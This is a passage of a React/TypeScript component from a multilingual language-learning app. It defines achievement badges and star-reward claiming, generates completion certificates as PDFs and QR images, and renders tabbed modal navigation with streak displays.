          ? '75 शब्दों में महारत'
          : isAr
          ? 'إتقان 75 كلمة'
          : '75 Words Mastered',
        description: isFa
          ? '۷۵ واژه مهم و کاربردی را با تلفظ عالی کامل کنید.'
          : isFr
          ? 'Maîtrisez 75 mots de vocabulaire essentiels.'
          : isUr
          ? 'اپنی زبان دانی کو مضبوط بناتے ہوئے 75 الفاظ مکمل کریں۔'
          : isHi
          ? 'अपनी भाषा पकड़ मज़बूत करते हुए 75 शब्द पूरे करें।'
          : isAr
          ? 'أتقن 75 كلمة أساسية بنطق سليم.'
          : 'Master 75 essential vocabulary words with confident voice accuracy.',
        current: Math.min(75, effectiveWordsMasteredUser),
        target: 75,
        unit: isFa ? 'واژه' : isFr ? 'mots' : isUr ? 'الفاظ' : isHi ? 'शब्द' : isAr ? 'كلمات' : 'words',
        unlocked:
          effectiveWordsMasteredUser >= 75 ||
          wordsCompleted >= 75 ||
          (wordsCompleted >= wordsTotal && wordsTotal > 0),
        rewardStars: 60,
      },
      {
        id: 'streak_1',
        icon: '✨',
        emblemKind: 'streak' as const,
        emblemGradient: 'from-amber-300 via-yellow-500 to-orange-500',
        tierLabel: isUr
          ? 'پہلا دن'
          : isHi
          ? 'पहला दिन'
          : isAr
          ? 'اليوم الأول'
          : 'Day 1 Spark',
        badgeTitle: 'First Day Streak Started',
        localizedTitle: isFa
          ? 'شروع اولین روز تمرین'
          : isFr
          ? 'Premier Jour d’Apprentissage'
          : isUr
          ? 'پہلے دن کی اسٹریک مکمل'
          : isHi
          ? 'पहले दिन की स्ट्रीक पूरी'
          : isAr
          ? 'بداية سلسلة اليوم الأول'
          : 'First Day Streak Started',
        description: isFa
          ? 'اولین روز یادگیری خود را با موفقیت آغاز کنید.'
          : isFr
          ? 'Allumez votre flamme d’apprentissage dès le premier jour.'
          : isUr
          ? 'اپنے سیکھنے کے سفر کا آغاز کریں اور پہلے دن کی اسٹریک روشن کریں۔'
          : isHi
          ? 'अपनी सीखने की यात्रा शुरू करें और पहले दिन की स्ट्रीक जलाएं।'
          : isAr
          ? 'ابدأ رحلة التعلم وأشعل شعلة اليوم الأول.'
          : 'Ignite your daily learning flame by completing Day 1 of practice.',
        current: Math.min(1, Math.max(0, streakDays)),
        target: 1,
        unit: isFa ? 'روز' : isFr ? 'jour' : isUr ? 'دن' : isHi ? 'दिन' : isAr ? 'يوم' : 'day',
        unlocked: streakDays >= 1,
        rewardStars: 10,
      },
      {
        id: 'streak_21',
        icon: '💎',
        emblemKind: 'streak' as const,
        emblemGradient: 'from-rose-500 via-pink-600 to-purple-700',
        tierLabel: isUr
          ? 'پکی عادت (21 دن)'
          : isHi
          ? 'पक्की आदत (21 दिन)'
          : isAr
          ? 'عادة راسخة (21 يوماً)'
          : '21-Day Habit',
        badgeTitle: '21 Day Habit Builder',
        localizedTitle: isFa
          ? 'قهرمان ۲۱ روز متوالی'
          : isFr
          ? 'Habitude de 21 Jours'
          : isUr
          ? '21 دن مسلسل اسٹریک ہیرو'
          : isHi
          ? '21 दिन लगातार स्ट्रीक हीरो'
          : isAr
          ? 'بطل سلسلة 21 يوماً'
          : '21 Day Habit Builder',
        description: isFa
          ? '۲۱ روز پیاپی تمرین کنید تا یادگیری زبان به عادت روزانه تبدیل شود.'
          : isFr
          ? 'Pratiquez 21 jours de suite pour ancrer votre habitude linguistique.'
          : isUr
          ? 'لگاتار 21 دن مشق کر کے زبان سیکھنے کو اپنی مستقل عادت بنائیں۔'
          : isHi
          ? 'लगातार 21 दिनों तक अभ्यास करके भाषा सीखने को अपनी पक्की आदत बनाएं।'
          : isAr
          ? 'واظب على التدريب لمدة 21 يوماً متتالية لبناء عادة دائمة.'
          : 'Practice for 21 consecutive days to lock in a lifelong language habit.',
        current: Math.min(21, Math.max(0, streakDays)),
        target: 21,
        unit: isFa ? 'روز' : isFr ? 'jours' : isUr ? 'دن' : isHi ? 'दिन' : isAr ? 'أيام' : 'days',
        unlocked: streakDays >= 21,
        rewardStars: 75,
      },
      {
        id: 'streak_60',
        icon: '👑',
        emblemKind: 'streak' as const,
        emblemGradient: 'from-yellow-400 via-orange-500 to-red-700',
        tierLabel: isUr
          ? 'ڈائمنڈ اسٹریک لیجنڈ'
          : isHi
          ? 'डायमंड स्ट्रीक लीजेंड'
          : isAr
          ? 'أسطورة الـ 60 يوماً'
          : 'Diamond Streak',
        badgeTitle: '60 Day Diamond Streak Legend',
        localizedTitle: isFa
          ? 'افسانه ۶۰ روز تمرین پیاپی'
          : isFr
          ? 'Légende Diamant 60 Jours'
          : isUr
          ? '60 دن کا ڈائمنڈ اسٹریک لیجنڈ'
          : isHi
          ? '60 दिन का डायमंड स्ट्रीक लीजेंड'
          : isAr
          ? 'أسطورة الـ 60 يوماً المتتالية'
          : '60 Day Diamond Streak Legend',
        description: isFa
          ? 'دو ماه کامل (۶۰ روز متوالی) تمرین روزانه را حفظ کنید.'
          : isFr
          ? 'Maintenez une série exceptionnelle de 60 jours consécutifs.'
          : isUr
          ? 'مسلسل دو ماہ (60 دن) تک روزانہ مشق کر کے ڈائمنڈ لیجنڈ بنیں۔'
          : isHi
          ? 'लगातार दो महीने (60 दिन) तक रोज़ाना अभ्यास करके डायमंड लीजेंड बनें।'
          : isAr
          ? 'حافظ على سلسلة التعلم لمدة شهرين كاملين (60 يوماً).'
          : 'Achieve two full months (60 days) of unstoppable daily language mastery.',
        current: Math.min(60, Math.max(0, streakDays)),
        target: 60,
        unit: isFa ? 'روز' : isFr ? 'jours' : isUr ? 'دن' : isHi ? 'दिन' : isAr ? 'أيام' : 'days',
        unlocked: streakDays >= 60,
        rewardStars: 150,
      },
      {
        id: 'balloons_10',
        icon: '🎈',
        emblemKind: 'balloons' as const,
        emblemGradient: 'from-sky-400 via-cyan-500 to-blue-600',
        tierLabel: isUr
          ? 'بلون اسٹارٹر'
          : isHi
          ? 'बैलून स्टार्टर'
          : isAr
          ? 'بداية البالونات'
          : 'Balloon Starter',
        badgeTitle: 'First 10 Balloons Popped',
        localizedTitle: isFa
          ? 'ترکاندن ۱۰ بادکنک اول'
          : isFr
          ? '10 Premiers Ballons'
          : isUr
          ? 'پہلے 10 غبارے پاپ کیے'
          : isHi
          ? 'पहले 10 गुब्बारे फोड़े'
          : isAr
          ? 'فرقعة أول 10 بالونات'
          : 'First 10 Balloons Popped',
        description: isFa
          ? '۱۰ بادکنک اول را با صدای خود بترکانید.'
          : isFr
          ? 'Éclatez vos 10 premiers ballons avec votre voix.'
          : isUr
          ? 'مائیکروفون میں بول کر اپنے پہلے 10 غبارے کامیابی سے پاپ کریں۔'
          : isHi
          ? 'माइक्रोफ़ोन में बोलकर अपने पहले 10 गुब्बारे सफलतापूर्वक फोड़ें।'
          : isAr
          ? 'فرقع أول 10 بالونات بصوتك في الميكروفون.'
          : 'Pop your first 10 interactive voice balloons using the microphone.',
        current: Math.min(10, totalBalloonsPoppedUser),
        target: 10,
        unit: isFa ? 'بادکنک' : isFr ? 'ballons' : isUr ? 'غبارے' : isHi ? 'गुब्बारे' : isAr ? 'بالون' : 'balloons',
        unlocked: totalBalloonsPoppedUser >= 10,
        rewardStars: 10,
      },
      {
        id: 'balloons_50',
        icon: '🎉',
        emblemKind: 'balloons' as const,
        emblemGradient: 'from-blue-500 via-indigo-500 to-purple-600',
        tierLabel: isUr
          ? 'بلون شوٹر'
          : isHi
          ? 'बैलून चैंपियन'
          : isAr
          ? 'بطل الـ 50 بالون'
          : 'Balloon Striker',
        badgeTitle: '50 Balloons Popped',
        localizedTitle: isFa
          ? 'ترکاندن ۵۰ بادکنک'
          : isFr
          ? '50 Ballons Éclatés'
          : isUr
          ? '50 غبارے پاپ کیے'
          : isHi
          ? '50 गुब्बारे फोड़े'
          : isAr
          ? 'فرقعة 50 بالون'
          : '50 Balloons Popped',
        description: isFa
          ? '۵۰ بادکنک صوتی را با تلفظ درست بترکانید.'
          : isFr
          ? 'Éclatez 50 ballons vocaux avec précision.'
          : isUr
          ? 'اپنی آواز اور درست تلفظ سے 50 غبارے پاپ کرنے کا ہدف مکمل کریں۔'
          : isHi
          ? 'अपनी आवाज़ और सही उच्चारण से 50 गुब्बारे फोड़ने का लक्ष्य पूरा करें।'
          : isAr
          ? 'فرقع 50 بالوناً صوتياً بنطق واضح.'
          : 'Reach 50 popped voice balloons across your learning stages.',
        current: Math.min(50, totalBalloonsPoppedUser),
        target: 50,
        unit: isFa ? 'بادکنک' : isFr ? 'ballons' : isUr ? 'غبارے' : isHi ? 'गुब्बारे' : isAr ? 'بالون' : 'balloons',
        unlocked: totalBalloonsPoppedUser >= 50 || courseCompleted,
        rewardStars: 30,
      },
      {
        id: 'conversation_5',
        icon: '🗨️',
        emblemKind: 'conversation' as const,
        emblemGradient: 'from-purple-400 via-violet-500 to-indigo-600',
        tierLabel: isUr
          ? 'آغازِ گفتگو'
          : isHi
          ? 'बातचीत की शुरुआत'
          : isAr
          ? 'بداية المحادثة'
          : 'Dialogue Starter',
        badgeTitle: 'First 5 Sentences Spoken',
        localizedTitle: isFa
          ? '۵ جمله اول مکالمه'
          : isFr
          ? '5 Premières Phrases'
          : isUr
          ? 'پہلے 5 جملے مکمل کیے'
          : isHi
          ? 'पहले 5 वाक्य पूरे किए'
          : isAr
          ? 'إتمام أول 5 جمل محادثة'
          : 'First 5 Sentences Spoken',
        description: isFa
          ? '۵ جمله اول خود را در بخش مکالمه بیان کنید.'
          : isFr
          ? 'Prononcez vos 5 premières phrases de conversation.'
          : isUr
          ? 'بات چیت کے مرحلے میں اپنے پہلے 5 حقیقی جملے کامیابی سے بولیں۔'
          : isHi
          ? 'बातचीत के चरण में अपने पहले 5 वाक्य सफलतापूर्वक बोलें।'
          : isAr
          ? 'انطق أول 5 جمل محادثة بنجاح.'
          : 'Speak or assemble your first 5 real-life conversation sentences.',
        current: Math.min(5, conversationsCompleted),
        target: 5,
        unit: isFa ? 'جمله' : isFr ? 'phrases' : isUr ? 'جملے' : isHi ? 'वाक्य' : isAr ? 'جمل' : 'sentences',
        unlocked: conversationsCompleted >= 5 || courseCompleted,
        rewardStars: 15,
      },
      {
        id: 'conversation_35',
        icon: '🎤',
        emblemKind: 'conversation' as const,
        emblemGradient: 'from-indigo-500 via-purple-600 to-pink-600',
        tierLabel: isUr
          ? 'اعتماد کے ساتھ گفتگو'
          : isHi
          ? 'आत्मविश्वासी वक्ता'
          : isAr
          ? 'متحدث واثق'
          : 'Confident Speaker',
        badgeTitle: 'Confident Speaker (35 Sentences)',
        localizedTitle: isFa
          ? 'سخنور مطمئن (۳۵ جمله)'
          : isFr
          ? 'Orateur Confiant (35 Phrases)'
          : isUr
          ? 'پراعتماد مقرر (35 جملے)'
          : isHi
          ? 'आत्मविश्वासी वक्ता (35 वाक्य)'
          : isAr
          ? 'متحدث واثق (35 جملة)'
          : 'Confident Speaker (35 Sentences)',
        description: isFa
          ? '۳۵ جمله کاربردی را در موقعیت‌های واقعی مکالمه کامل کنید.'
          : isFr
          ? 'Complétez 35 phrases de conversation avec assurance.'
          : isUr
          ? 'مختلف حالات میں بولے جانے والے 35 اہم جملے مکمل کریں۔'
          : isHi
          ? 'विभिन्न परिस्थितियों में बोले जाने वाले 35 महत्वपूर्ण वाक्य पूरे करें।'
          : isAr
          ? 'أكمل 35 جملة محادثة في مواقف الحياة اليومية.'
          : 'Complete 35 real-world conversation sentences with natural confidence.',
        current: Math.min(35, conversationsCompleted),
        target: 35,
        unit: isFa ? 'جمله' : isFr ? 'phrases' : isUr ? 'جملے' : isHi ? 'वाक्य' : isAr ? 'جمل' : 'sentences',
        unlocked: conversationsCompleted >= 35 || courseCompleted,
        rewardStars: 60,
      },
      {
        id: 'traveler_topics_5',
        icon: '🧭',
        emblemKind: 'travel' as const,
        emblemGradient: 'from-sky-500 via-indigo-500 to-purple-600',
        tierLabel: isUr
          ? 'سفر کا آغاز'
          : isHi
          ? 'ट्रैवल स्टार्टर'
          : isAr
          ? 'بداية المسافر'
          : 'City Navigator',
        badgeTitle: 'City Navigator (5 Topics)',
        localizedTitle: isFa
          ? 'مسیریاب شهر (۵ موضوع)'
          : isFr
          ? 'Navigateur Urbain (5 Sujets)'
          : isUr
          ? 'سمارٹ مسافر (5 ٹاپکس)'
          : isHi
          ? 'स्मार्ट ट्रैवलर (5 टॉपिक्स)'
          : isAr
          ? 'مستكشف المدينة (5 مواضيع)'
          : 'City Navigator (5 Topics)',
        description: isFa
          ? '۵ موضوع اول مکالمات سفر و زندگی روزمره را کامل کنید.'
          : isFr
          ? 'Complétez 5 sujets de conversation essentiels.'
          : isUr
          ? 'سفر اور روزمرہ زندگی کے پہلے 5 گفتگو کے ٹاپکس مکمل کریں۔'
          : isHi
          ? 'यात्रा और रोज़मर्रा की ज़िंदगी के पहले 5 बातचीत के टॉपिक्स पूरे करें।'
          : isAr
          ? 'أكمل أول 5 مواضيع محادثة للسفر والحياة اليومية.'
          : 'Complete 5 real-life conversation topics across the 90-topic path.',
        current: Math.min(5, Math.max(0, Math.floor(conversationsCompleted / 5))),
        target: 5,
        unit: isFa ? 'موضوع' : isFr ? 'sujets' : isUr ? 'ٹاپکس' : isHi ? 'टॉपिक्स' : isAr ? 'مواضيع' : 'topics',
        unlocked:
          conversationsCompleted >= 25 ||
          adminUnlockedTopicsCount >= 5 ||
          courseCompleted,
        rewardStars: 20,
      },
      {
        id: 'stars_100',
        icon: '🌠',
        emblemKind: 'stars' as const,
        emblemGradient: 'from-amber-400 via-yellow-500 to-orange-500',
        tierLabel: isUr
          ? 'رائزنگ اسٹار'
          : isHi
          ? 'राइजिंग स्टार'
          : isAr
          ? 'النجم الصاعد'
          : 'Rising Star',
        badgeTitle: '100 Stars Rising Collector',
        localizedTitle: isFa
          ? 'برنده ۱۰۰ ستاره اول'
          : isFr
          ? 'Collectionneur 100 Étoiles'
          : isUr
          ? 'پہلے 100 ستاروں کا اعزاز'
          : isHi
          ? 'पहले 100 सितारों का सम्मान'
          : isAr
          ? 'جامع أول 100 نجمة'
          : '100 Stars Rising Collector',
        description: isFa
          ? '۱۰۰ ستاره طلایی اول خود را با تمرین و پاداش روزانه جمع کنید.'
          : isFr
          ? 'Gagnez vos 100 premières étoiles dorées.'
          : isUr
          ? 'مشق اور ڈیلی بلون بونس کے ذریعے اپنے پہلے 100 سنہری ستارے حاصل کریں۔'
          : isHi
          ? 'अभ्यास और डेली बैलून बोनस के ज़रिए अपने पहले 100 सुनहरे सितारे हासिल करें।'
          : isAr
          ? 'اجمع أول 100 نجمة ذهبية من خلال التدريب والمكافآت اليومية.'
          : 'Collect your first 100 golden stars through lessons and daily bonuses.',
        current: Math.min(100, Math.max(0, stars)),
        target: 100,
        unit: isFa ? 'ستاره' : isFr ? 'étoiles' : isUr ? 'ستارے' : isHi ? 'सितारे' : isAr ? 'نجوم' : 'stars',
        unlocked: stars >= 100,
        rewardStars: 25,
      },
    ];
  }, [
    nativeLang.code,
    streakDays,
    totalBalloonsPoppedUser,
    effectiveWordsMasteredUser,
    wordsCompleted,
    wordsTotal,
    conversationsCompleted,
    adminUnlockedTopicsCount,
    stars,
    courseCompleted,
  ]);

  const unlockedAchievementsCount = useMemo(
    () => achievementsList.filter((a) => a.unlocked).length,
    [achievementsList]
  );

  const unclaimedUnlockedAchievements = useMemo(
    () =>
      achievementsList.filter(
        (a) => a.unlocked && !claimedAchievementIds.includes(a.id)
      ),
    [achievementsList, claimedAchievementIds]
  );

  const filteredAchievements = useMemo(() => {
    if (achievementFilter === 'unlocked') {
      return achievementsList.filter((a) => a.unlocked);
    }
    if (achievementFilter === 'locked') {
      return achievementsList.filter((a) => !a.unlocked);
    }
    return achievementsList;
  }, [achievementsList, achievementFilter]);

  const handleClaimAchievementReward = (badgeId: string, rewardStars: number, title: string) => {
    if (claimedAchievementIds.includes(badgeId)) {
      showTempToast(mt.alreadyClaimedToast(title));
      return;
    }
    const nextClaimed = [...claimedAchievementIds, badgeId];
    setClaimedAchievementIds(nextClaimed);
    try {
      localStorage.setItem(
        'balloony_claimed_achievements_v1',
        JSON.stringify(nextClaimed)
      );
    } catch {}
    if (onChangeStars) {
      onChangeStars(Math.max(0, Number(stars || 0) + rewardStars));
    }
    showTempToast(mt.claimedSuccessToast(title, rewardStars));
  };

  const handleClaimAllUnlockedRewards = () => {
    if (unclaimedUnlockedAchievements.length === 0) return;
    const totalBonus = unclaimedUnlockedAchievements.reduce(
      (sum, item) => sum + item.rewardStars,
      0
    );
    const nextClaimed = Array.from(
      new Set([
        ...claimedAchievementIds,
        ...unclaimedUnlockedAchievements.map((a) => a.id),
      ])
    );
    setClaimedAchievementIds(nextClaimed);
    try {
      localStorage.setItem(
        'balloony_claimed_achievements_v1',
        JSON.stringify(nextClaimed)
      );
    } catch {}
    if (onChangeStars) {
      onChangeStars(Math.max(0, Number(stars || 0) + totalBonus));
    }
    showTempToast(`+${totalBonus} ⭐ Claimed from ${unclaimedUnlockedAchievements.length} Badges!`);
  };

  const handleUploadCustomCertTemplate = (
    e: React.ChangeEvent<HTMLInputElement>
  ) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = () => {
      const result = typeof reader.result === 'string' ? reader.result : null;
      if (result) {
        setCustomCertBgDataUrl(result);
        setSelectedTemplate('custom');
        try {
          localStorage.setItem(CUSTOM_CERT_BG_STORAGE_KEY, result);
          localStorage.setItem(CERT_TEMPLATE_CHOICE_KEY, 'custom');
        } catch {}
        showTempToast(mt.customCertSavedToast);
      }
    };
    reader.readAsDataURL(file);
  };

  // Automatically update live preview whenever certificate tab is open and name/date/language/QR/template changes
  useEffect(() => {
    if (!isOpen || activeTab !== 'certificate' || !courseCompleted) return;
    let cancelled = false;
    const timer = setTimeout(async () => {
      try {
        const { canvas, qrDataUrl, qrPayload } =
          await renderLocalizedCertificateCanvas({
            recipientName:
              learnerName || currentUser?.displayName || 'Student Name',
            nativeLang,
            targetLang,
            certLanguageMode,
            completionDate,
            selectedTemplate,
            customCertBgDataUrl,
            customQrText,
          });
        if (!cancelled) {
          setLivePreviewDataUrl(canvas.toDataURL('image/png'));
          setQrPreviewDataUrl(qrDataUrl);
          setQrEncodedPayload(qrPayload);
        }
      } catch {}
    }, 60);
    return () => {
      cancelled = true;
      clearTimeout(timer);
    };
  }, [
    isOpen,
    activeTab,
    courseCompleted,
    learnerName,
    currentUser?.displayName,
    nativeLang,
    targetLang,
    certLanguageMode,
    completionDate,
    selectedTemplate,
    customCertBgDataUrl,
    customQrText,
  ]);

  const generateAndDownloadCertificatePdf = async (targetLearner?: {
    name: string;
    nativeCode?: string;
    targetCode?: string;
    completedDate?: string;
  }) => {
    setIsGeneratingPdf(true);
    try {
      const resolvedNative = targetLearner?.nativeCode
        ? WORLD_LANGUAGES.find((l) => l.code === targetLearner.nativeCode) ||
          nativeLang
        : nativeLang;
      const resolvedTarget = targetLearner?.targetCode
        ? WORLD_LANGUAGES.find((l) => l.code === targetLearner.targetCode) ||
          targetLang
        : targetLang;

      const { canvas, recipientName } = await renderLocalizedCertificateCanvas({
        recipientName:
          targetLearner?.name ||
          learnerName ||
          currentUser?.displayName ||
          'Student Name',
        nativeLang: resolvedNative,
        targetLang: resolvedTarget,
        certLanguageMode: targetLearner ? 'spoken' : certLanguageMode,
        completionDate: targetLearner?.completedDate || completionDate,
        selectedTemplate,
        customCertBgDataUrl,
        customQrText,
      });

      const imgData = canvas.toDataURL('image/png');

      const pdf = new jsPDF({
        orientation: 'landscape',
        unit: 'px',
        format: [1536, 1024],
      });
      pdf.addImage(imgData, 'PNG', 0, 0, 1536, 1024);
      const safeFileName =
        recipientName.replace(/[^a-zA-Z0-9\u0600-\u06FF_-]/g, '_') || 'Learner';
      pdf.save(
        `Learning_Balloon_${resolvedTarget.code.toUpperCase()}_Certificate_${safeFileName}.pdf`
      );
      showTempToast(mt.certPdfDownloadedToast);
    } catch (err) {
      console.error('Certificate PDF generation error:', err);
      showTempToast(mt.certPdfErrorToast);
    } finally {
      setIsGeneratingPdf(false);
    }
  };

  const handleDownloadStandaloneQrPng = () => {
    if (!qrPreviewDataUrl) return;
    const a = document.createElement('a');
    a.href = qrPreviewDataUrl;
    const safeName =
      (learnerName || currentUser?.displayName || 'Student').replace(
        /[^a-zA-Z0-9\u0600-\u06FF_-]/g,
        '_'
      ) || 'Student';
    a.download = `Learning_Balloon_QR_${safeName}.png`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    showTempToast(mt.qrPngDownloadedToast);
  };

  const readableCompletionDate = formatReadableDate(
    completionDate,
    certLanguageMode === 'spoken' ? nativeLang.code : targetLang.code
  );
  const previewSerial = buildCertificateSerial(
    learnerName || currentUser?.displayName || 'Student',
    completionDate,
    targetLang.code
  );

  return (
    <AnimatePresence>
      {isOpen && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 z-[100] bg-slate-950/80 backdrop-blur-md flex items-center justify-center p-2.5 sm:p-5 md:p-7 pointer-events-auto"
          onClick={onClose}
        >
          <motion.div
            initial={{ scale: 0.96, y: 8, opacity: 0 }}
            animate={{ scale: 1, y: 0, opacity: 1 }}
            exit={{ scale: 0.96, y: 8, opacity: 0 }}
            onClick={(e) => e.stopPropagation()}
            dir={nativeLang.rtl ? 'rtl' : 'ltr'}
            className={`w-full max-w-6xl max-h-[88vh] sm:max-h-[90vh] my-auto rounded-2xl border p-3.5 sm:p-5 flex flex-col shadow-2xl overflow-hidden ${
              isDark
                ? 'bg-slate-950 border-slate-800 text-white'
                : 'bg-white border-slate-200 text-slate-900 shadow-[0_25px_70px_rgba(15,23,42,0.22)]'
            }`}
          >
            {/* Top Modal Header + Clean Segmented Navigation Tabs */}
            <div className="shrink-0 flex flex-wrap items-center justify-between gap-2 pb-3.5 border-b border-slate-200 dark:border-slate-800">
              <div
                className={`inline-flex items-center gap-1 p-1 rounded-xl border flex-wrap ${
                  isDark
                    ? 'bg-slate-900 border-slate-800'
                    : 'bg-slate-100 border-slate-200'
                }`}
              >
                <button
                  type="button"
                  onClick={() => setActiveTab('streak_level')}
                  className={`px-3 py-1.5 rounded-lg font-display font-bold text-xs sm:text-sm flex items-center gap-1.5 transition-colors cursor-pointer whitespace-nowrap ${
                    activeTab === 'streak_level'
                      ? isDark
                        ? 'bg-slate-800 text-white shadow-xs'
                        : 'bg-white text-slate-900 shadow-xs'
                      : isDark
                      ? 'text-slate-400 hover:text-slate-200'
                      : 'text-slate-600 hover:text-slate-900'
                  }`}
                >
                  <Flame className="w-3.5 h-3.5 text-amber-500" />
                  <span>{mt.tabStreakLevels}</span>
                </button>

                <button
                  type="button"
                  onClick={() => setActiveTab('achievements')}
                  className={`px-3 py-1.5 rounded-lg font-display font-bold text-xs sm:text-sm flex items-center gap-1.5 transition-colors cursor-pointer whitespace-nowrap ${
                    activeTab === 'achievements'
                      ? isDark
                        ? 'bg-slate-800 text-white shadow-xs'
                        : 'bg-white text-slate-900 shadow-xs'
                      : isDark
                      ? 'text-slate-400 hover:text-slate-200'
                      : 'text-slate-600 hover:text-slate-900'
                  }`}
                >
                  <Sparkles className="w-3.5 h-3.5 text-amber-500" />
                  <span>
                    {mt.tabAchievements(
                      unlockedAchievementsCount,
                      achievementsList.length
                    )}
                  </span>
                </button>

                <button
                  type="button"
                  onClick={() => setActiveTab('leaderboard')}
                  className={`px-3 py-1.5 rounded-lg font-display font-bold text-xs sm:text-sm flex items-center gap-1.5 transition-colors cursor-pointer whitespace-nowrap ${
                    activeTab === 'leaderboard'
                      ? isDark
                        ? 'bg-slate-800 text-white shadow-xs'
                        : 'bg-white text-slate-900 shadow-xs'
                      : isDark
                      ? 'text-slate-400 hover:text-slate-200'
                      : 'text-slate-600 hover:text-slate-900'
                  }`}
                >
                  <Trophy className="w-3.5 h-3.5 text-amber-500" />
                  <span>{mt.tabLeaderboard}</span>
                </button>

                {courseCompleted && (
                  <button
                    type="button"
                    onClick={() => setActiveTab('certificate')}
                    className={`px-3 py-1.5 rounded-lg font-display font-bold text-xs sm:text-sm flex items-center gap-1.5 transition-colors cursor-pointer whitespace-nowrap ${
                      activeTab === 'certificate'
                        ? isDark
                          ? 'bg-slate-800 text-white shadow-xs'
                          : 'bg-white text-slate-900 shadow-xs'
                        : isDark
                        ? 'text-slate-400 hover:text-slate-200'
                        : 'text-slate-600 hover:text-slate-900'
                    }`}
                  >
                    <Award className="w-3.5 h-3.5 text-emerald-500" />
                    <span>{mt.tabCertificate}</span>
                  </button>
                )}

                {canOpenAdminPanel && (
                  <button
                    type="button"
                    onClick={() => {
                      setActiveTab('admin');
                      if (unreadSecurityCount > 0) {
                        markAllSecurityIncidentsRead();
                      }
                    }}
                    className={`px-3 py-1.5 rounded-lg font-display font-bold text-xs sm:text-sm flex items-center gap-1.5 transition-colors cursor-pointer whitespace-nowrap ${
                      activeTab === 'admin'
                        ? 'bg-sky-500 text-slate-950 shadow-xs'
                        : unreadSecurityCount > 0
                        ? 'bg-rose-600 text-white animate-pulse'
                        : isDark
                        ? 'text-sky-400 hover:bg-slate-800'
                        : 'text-sky-700 hover:bg-slate-200/70'
                    }`}
                  >
                    <ShieldCheck className="w-3.5 h-3.5" />
                    <span>{mt.tabAdmin}</span>
                    {securityIncidents.length > 0 && (
                      <span className="px-1.5 py-0.5 rounded-full bg-rose-500 text-white text-[10px] font-black">
                        🚨 {securityIncidents.length}
                      </span>
                    )}
                  </button>
                )}
              </div>

              <button
                type="button"
                onClick={onClose}
                className={`p-2 rounded-lg border transition-colors cursor-pointer shrink-0 ${
                  isDark
                    ? 'bg-slate-900 border-slate-800 hover:bg-slate-800 text-slate-300'
                    : 'bg-slate-100 border-slate-200 hover:bg-slate-200 text-slate-700'
                }`}
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            {statusToast && (
              <div className="shrink-0 mt-3 px-4 py-2 rounded-lg bg-emerald-500/15 border border-emerald-500/30 text-emerald-600 dark:text-emerald-400 font-display font-bold text-xs sm:text-sm text-center">
                {statusToast}
              </div>
            )}

            {/* Modal Body */}
            <div className="min-h-0 flex-1 overflow-y-auto py-4 px-1 space-y-5">
              {/* TAB 1: DAILY STREAK & DIFFICULTY LEVELS */}
              {activeTab === 'streak_level' && (
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 sm:gap-5">
                  {/* Daily Streak Box + Custom Streak Setter */}
                  <div
                    className={`rounded-3xl p-4 sm:p-5 border-2 flex flex-col justify-between ${
                      isDark
                        ? 'bg-slate-800/80 border-slate-700'
                        : 'bg-gradient-to-b from-amber-50/90 to-orange-50/60 border-amber-200'
                    }`}
                  >
                    <div>
                      <div className="flex items-center justify-between gap-2 mb-3">
                        <span className="inline-flex items-center gap-1.5 px-3 py-1 rounded-xl bg-amber-500/20 text-amber-600 dark:text-amber-300 text-xs font-extrabold">
                          <Flame className="w-4 h-4 fill-amber-500 text-amber-500" />
                          {mt.dailyStreakBadge}
                        </span>
                        <span className="text-xs font-bold text-slate-500 dark:text-slate-400">
                          {mt.goalDaysLabel(streakGoalDays)}
                        </span>
                      </div>

                      <div className="flex items-center gap-4 my-3">
                        <div className="w-16 h-16 sm:w-20 sm:h-20 rounded-3xl bg-gradient-to-b from-amber-400 to-orange-500 text-white flex flex-col items-center justify-center shadow-[0_5px_0_#C2410C]">
                          <span className="font-display font-extrabold text-2xl sm:text-3xl leading-none">
                            {streakDays}
                          </span>
                          <span className="text-[11px] font-bold">
                            {mt.streakUnitLabel}
                          </span>
                        </div>
                        <div className="flex-1">
                          <h4 className="font-display font-extrabold text-base sm:text-lg">
                            {mt.streakCardHeading}
                          </h4>
                          <p className="text-xs sm:text-sm text-slate-600 dark:text-slate-300 mt-0.5">
                            {mt.streakCardDesc}
                          </p>
                          <div className="mt-2 w-full h-2.5 rounded-full bg-slate-200 dark:bg-slate-700 overflow-hidden">
                            <div
                              className="h-full bg-gradient-to-r from-amber-400 to-rose-500 rounded-full transition-all duration-300"
                              style={{
                                width: `${Math.min(
                                  100,
                                  Math.round(
                                    (streakDays / Math.max(1, streakGoalDays)) * 100
                                  )
                                )}%`,
                              }}
                            />
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* 100% Automatic Streak Engine Status & 7-Day Flame Calendar */}
                    <div
                      className={`mt-4 pt-4 border-t ${
                        isDark ? 'border-slate-700' : 'border-amber-200/80'
                      }`}
                    >
                      <div className="flex items-center justify-between gap-2 mb-3">
                        <div className="flex items-center gap-1.5 text-xs font-extrabold text-amber-600 dark:text-amber-300">
                          <Flame className="w-3.5 h-3.5 fill-amber-500 text-amber-500" />
                          <span>{mt.dailyStreakBadge}</span>
                        </div>
                        <span className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full bg-emerald-500/15 border border-emerald-500/30 text-emerald-600 dark:text-emerald-300 text-[11px] font-extrabold">
                          <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                          <span>AUTO</span>
                        </span>
                      </div>

                      {/* 7-Day Automatic Flame Cycle Strip (Starts from the exact weekday the learner logged in / started their streak!) */}
                      <div className="grid grid-cols-7 gap-1.5 mb-3">
                        {(() => {
                          const dashTrans = getDashboardTranslations(nativeLang);
                          const todayMonZeroIdx = (new Date().getDay() + 6) % 7;
                          const cycleFilled =
                            streakDays > 0
                              ? ((streakDays - 1) % 7) + 1
                              : 1;
                          const startWeekdayIdx =
                            (todayMonZeroIdx - (cycleFilled - 1) + 7) % 7;

                          return [1, 2, 3, 4, 5, 6, 7].map((daySlot) => {
                            const slotIdx = daySlot - 1;
                            const weekdayIdx = (startWeekdayIdx + slotIdx) % 7;
                            const weekdayLabel =
                              dashTrans.weekDaysShort[weekdayIdx];
                            const isLit = daySlot <= cycleFilled;
